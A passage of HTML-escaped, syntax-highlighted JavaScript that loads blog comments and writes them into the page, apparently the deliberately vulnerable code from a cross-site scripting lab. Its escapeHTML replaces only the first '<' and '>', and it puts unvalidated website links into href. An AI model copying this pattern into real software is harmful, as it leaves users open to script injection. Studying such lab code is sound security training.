&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this.&lt;&#x2F;span&gt;&lt;span&gt;readyState &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp; this.&lt;&#x2F;span&gt;&lt;span&gt;status &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;comments &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;JSON&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;parse&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this.&lt;&#x2F;span&gt;&lt;span&gt;responseText)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;displayComments&lt;&#x2F;span&gt;&lt;span&gt;(comments)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    xhr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;GET&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;postCommentPath &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;window&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;location&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;search)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    xhr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;escapeHTML&lt;&#x2F;span&gt;&lt;span&gt;(html) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;html&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;lt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;amp;lt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;displayComments&lt;&#x2F;span&gt;&lt;span&gt;(comments) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;userComments &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getElementById&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;user-comments&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;comments&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;i)
&lt;&#x2F;span&gt;&lt;span&gt;        {
&lt;&#x2F;span&gt;&lt;span&gt;            comment &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;comments[i]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;commentSection &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;section&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            commentSection&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAttribute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;class&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;comment&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;firstPElement &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;p&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;avatarImgElement &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;img&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            avatarImgElement&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAttribute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;class&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;avatar&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            avatarImgElement&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAttribute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;src&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;comment&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;avatar &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;escapeHTML&lt;&#x2F;span&gt;&lt;span&gt;(comment&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;avatar) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&#x2F;resources&#x2F;images&#x2F;avatarDefault.svg&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(comment&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;author) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(comment&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;website) {
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;websiteElement &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;a&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                    websiteElement&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAttribute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;id&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;author&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                    websiteElement&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAttribute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;href&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;comment&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;website)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                    firstPElement&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(websiteElement)
&lt;&#x2F;span&gt;&lt;span&gt;                }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;newInnerHtml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;firstPElement&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerHTML &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;escapeHTML&lt;&#x2F;span&gt;&lt;span&gt;(comment&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;author)
&lt;&#x2F;span&gt;&lt;span&gt;                firstPElement&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerHTML &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;newInnerHtml
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(comment&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;date) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;dateObj &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Date&lt;&#x2F;span&gt;&lt;span&gt;(comment&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;date)
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;month &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;(dateObj&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getMonth&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;day &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;dateObj&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getDate&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;year &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;dateObj&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getFullYear&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(month&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;                    month &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;month&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(day&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;                    day &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;day&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                dateStr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[day&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;month&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;year]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;-&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;newInnerHtml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;firstPElement&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerHTML &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot; | &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;dateStr
&lt;&#x2F;span&gt;&lt;span&gt;                firstPElement&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerHTML &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;newInnerHtml
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            firstPElement&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(avatarImgElement)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            commentSection&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(firstPElement)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(comment&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;body) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span&gt;commentBodyPElement &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createElement&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;p&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                commentBodyPElement&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;innerHTML &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;escapeHTML&lt;&#x2F;span&gt;&lt;span&gt;(comment&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;body)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                commentSection&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;appendChild&lt;&#x2F;span&gt;&lt;span&gt;(commentBodyPElement)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
